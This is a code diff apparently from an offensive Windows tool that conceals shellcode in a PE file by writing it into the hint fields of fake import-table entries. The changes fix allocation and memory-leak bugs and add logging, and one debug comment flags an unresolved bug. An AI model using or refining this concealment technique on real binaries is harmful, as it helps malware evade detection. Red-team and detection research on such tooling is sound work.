@@ -56,7 +56,7 @@ int CalculateNumberOfFakeEntries(int numberOfChunks,FAKEIMPORT* fakeImportList) 
 		returnValue++;
 		fakeImportList[i].name = dllNames[i];
 		fakeImportList[i].numberOfImports = (numberOfChunks > numberOfNames) ? numberOfNames : numberOfChunks;
-		fakeImportList[i].offsetArray = (PBYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fakeImportList[i].numberOfImports);
+		fakeImportList[i].offsetArray = (PBYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fakeImportList[i].numberOfImports*sizeof(PBYTE *));
 		if (fakeImportList[i].offsetArray == NULL) {
 			std::cout << "[!] Error on heap allocation !" << std::endl;
 			return 0;
@@ -65,7 +65,7 @@ int CalculateNumberOfFakeEntries(int numberOfChunks,FAKEIMPORT* fakeImportList) 
 	}
 	if (numberOfChunks > 0) {
 		std::cout << "[!] Shellcode size is bigger than the exports of dlls in the dllNames array !" << std::endl;
-		std::cout << "[!] Add new dlls to this array !" << std::endl;
+		std::cout << "[!] Add new dll names to the dllNames array !" << std::endl;
 		return 0;
 	}
 	return returnValue;
@@ -128,6 +128,7 @@ LPCSTR* SelectDLLEntries(LPCSTR dllName, uint64_t numberOfDesiredFunctions) {
 	}
 	LPCSTR* returnValue = GetImportNamesFromIndex(dllBuffer,selectedIndexes,numberOfDesiredFunctions);
 	HeapFree(GetProcessHeap(), 0, selectedIndexes);
+	HeapFree(GetProcessHeap(), 0, dllBuffer);
 	return returnValue;
 }
 
@@ -159,6 +160,7 @@ PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOf
 	if (numberOfRequiredDLLs == 0) {
 		return NULL;
 	}
+	std::cout << "[+] Number of DLL for storing shellcode is: " << numberOfRequiredDLLs << std::endl;
 	if (dwExistingImportDescriptorEntryCount == 0){
 		// the target process doesn't have any imported dll entries, 1 for last entry which is 0 and fakes
 		dwNewImportDescriptorEntryCount = numberOfRequiredDLLs +1;
@@ -292,10 +294,11 @@ bool AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks)
 	offsetCursor = 0;
 	for (int i = 0; i < numberOfRequiredDLLs; i++) {
 		for (int j = 0; j < fakeImportList[i].numberOfImports; j++) {
-			memcpy(&hintNameEntries->Hint, &hintArray[chunkIndex++], sizeof(WORD));
-			memcpy(&hintNameEntries->Name, fakeImportList[i].nameofImports[j], strlen(fakeImportList[i].nameofImports[j]));
+			memcpy(&(hintNameEntries->Hint), &hintArray[chunkIndex++], sizeof(WORD));
+			memcpy(&(hintNameEntries->Name), fakeImportList[i].nameofImports[j], strlen(fakeImportList[i].nameofImports[j]));
 			// Save the hint/name table entries address for saving
-			fakeImportList[i].offsetArray[j] = (PBYTE ) &hintNameEntries->Hint;
+			fakeImportList[i].offsetArray[j] = (PBYTE ) (&(hintNameEntries->Hint));
+			// BUGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG jValue 2bd, i value 0
 			hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(((PBYTE)hintNameEntries) + sizeof(WORD) + strlen(fakeImportList[i].nameofImports[j]) + 1);
 		}
 	}
@@ -329,6 +332,7 @@ bool AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks)
 		memcpy(freeMemoryStartAfterFunctionNames + cursorOffsetForILT, importLookupTableTemp, sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1));
 		fakeImportList[i].firstThunkAddr = freeMemoryStartAfterFunctionNames + cursorOffsetForILT;
 		cursorOffsetForILT = cursorOffsetForILT + sizeof(IMAGE_THUNK_DATA) * (fakeImportList[i].numberOfImports + 1);
+		HeapFree(GetProcessHeap(), 0, importLookupTableTemp);
 	}
 
 	
